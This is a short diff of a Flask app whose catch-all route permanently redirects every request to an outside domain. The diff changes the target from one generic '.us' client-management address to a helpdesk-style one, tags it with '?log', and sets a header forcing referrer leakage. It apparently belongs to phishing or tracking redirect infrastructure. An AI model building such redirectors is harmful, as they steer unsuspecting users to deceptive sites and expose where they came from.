@@ -9,7 +9,7 @@ app = Flask(__name__)
 
 @app.route('/<name>')
 def hello(name):
-    r = make_response(redirect(f"https://client-management.us/session/?log", code=301))
+    r = make_response(redirect(f"https://client-helpdesk.us/monitoring/?log", code=301))
     r.headers.set('alt-svc', "clear")
     r.headers.set('cache-control', "private, max-age=90")
     r.headers.set('content-security-policy', "referrer always;")
